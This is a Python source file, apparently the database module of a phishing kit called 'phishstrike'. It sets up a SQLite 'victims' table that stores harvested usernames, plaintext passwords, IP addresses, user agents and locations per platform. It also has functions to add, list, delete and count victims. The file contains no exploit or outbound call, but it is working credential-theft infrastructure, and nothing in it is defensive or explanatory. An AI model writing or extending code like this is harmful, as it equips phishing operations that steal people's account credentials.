import sqlite3
import os
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "auth/phishstrike.db")


def init_db():
    if not os.path.exists(os.path.join(BASE_DIR, "auth")):
        os.makedirs(os.path.join(BASE_DIR, "auth"))

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    # Create victims table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            platform TEXT,
            username TEXT,
            password TEXT,
            ip TEXT,
            timestamp DATETIME,
            user_agent TEXT,
            location TEXT
        )
    """)

    conn.commit()
    conn.close()


def add_victim(
    platform, username, password, ip, user_agent="Unknown", location="Unknown"
):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    cursor.execute(
        """
        INSERT INTO victims (platform, username, password, ip, timestamp, user_agent, location)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """,
        (platform, username, password, ip, timestamp, user_agent, location),
    )

    conn.commit()
    conn.close()


def get_all_victims():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM victims ORDER BY timestamp DESC")
    rows = cursor.fetchall()
    conn.close()
    return rows


def delete_victim(victim_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM victims WHERE id = ?", (victim_id,))
    conn.commit()
    conn.close()


def get_stats():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    cursor.execute("SELECT COUNT(*) FROM victims")
    total = cursor.fetchone()[0]

    cursor.execute("SELECT platform, COUNT(*) FROM victims GROUP BY platform")
    platform_stats = cursor.fetchall()

    conn.close()
    return {"total": total, "platforms": platform_stats}
